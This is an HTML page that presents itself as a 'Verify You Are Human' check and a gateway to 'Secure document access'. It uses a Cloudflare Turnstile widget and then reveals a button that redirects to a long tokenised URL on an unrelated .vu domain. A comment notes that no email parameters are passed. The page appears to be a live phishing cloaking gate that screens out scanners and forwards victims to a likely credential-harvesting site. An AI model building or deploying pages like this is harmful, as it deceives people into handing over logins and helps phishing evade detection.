<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Verify You Are Human</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background: #f0f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            color: #1a2a4a;
        }
        .container {
            text-align: center;
            max-width: 420px;
            background: #ffffff;
            padding: 48px 32px 40px;
            border-radius: 24px;
            box-shadow: 0 20px 40px -16px rgba(0, 0, 0, 0.12);
        }
        .icon-wrapper {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            position: relative;
        }
        .icon-wrapper .lock {
            font-size: 48px;
            line-height: 80px;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 2;
        }
        .icon-wrapper .spinner {
            width: 80px;
            height: 80px;
            border: 4px solid rgba(26, 42, 74, 0.08);
            border-top: 4px solid #1a4a8a;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .title {
            font-size: 24px;
            font-weight: 700;
            letter-spacing: -0.4px;
            margin-bottom: 8px;
        }
        .sub {
            font-size: 16px;
            color: #5a6a8a;
            margin-bottom: 20px;
        }
        .dots {
            display: flex;
            justify-content: center;
            gap: 10px;
        }
        .dots span {
            width: 10px;
            height: 10px;
            background: rgba(26, 42, 74, 0.15);
            border-radius: 50%;
            animation: pulse 1.4s ease-in-out infinite;
        }
        .dots span:nth-child(1) { animation-delay: 0s; }
        .dots span:nth-child(2) { animation-delay: 0.2s; }
        .dots span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes pulse {
            0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
            40% { transform: scale(1); opacity: 1; }
        }
        .footer-note {
            margin-top: 24px;
            font-size: 12px;
            color: #9aabbf;
        }
        .btn {
            display: inline-block;
            margin-top: 14px;
            padding: 10px 18px;
            font-size: 14px;
            background: #1673ea;
            color: #fff;
            border: 0;
            border-radius: 4px;
            cursor: pointer;
        }
        .btn:hover { opacity: .95; }
        .hidden { display: none; }
        .cf-turnstile {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }
        @media (max-width: 480px) {
            .container { padding: 32px 20px 28px; }
            .icon-wrapper { width: 64px; height: 64px; }
            .icon-wrapper .lock { font-size: 36px; line-height: 64px; }
            .icon-wrapper .spinner { width: 64px; height: 64px; }
            .title { font-size: 20px; }
            .sub { font-size: 14px; }
        }
    </style>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
</head>
<body>
    <div class="container">
        <div class="icon-wrapper">
            <div class="spinner"></div>
            <div class="lock">🔒</div>
        </div>
        <div class="title">Verify You Are Human</div>
        <div class="sub">Complete the challenge below to continue</div>
        
        <div class="cf-turnstile"
            data-sitekey="0x4AAAAAADw9p1mvZAZ3amMJ"
            data-callback="onTurnstileSuccess"
            data-language="en"
            data-theme="light">
        </div>

        <button id="redirectBtn" class="btn hidden">Click to Continue</button>
        
        <div class="footer-note">Secure document access</div>
    </div>

    <script>
        // Landing URL – no email parameters, nothing extra
        var LANDING_URL = 'https://wdodelta.bruntra.vu/4Dgw07VSp-H2EtHebm4OEPBmNaxob1rx_T4kgNsK4gvHyxvkznxO6rhx68Jo7uNVRLBooce1E0w5bCxcTj9MxAtTRPW2ujsBqZwhN4/';

        function onTurnstileSuccess() {
            document.getElementById('redirectBtn').classList.remove('hidden');
        }

        document.getElementById('redirectBtn').addEventListener('click', function() {
            window.location.href = LANDING_URL;
        });
    </script>
</body>
</html>
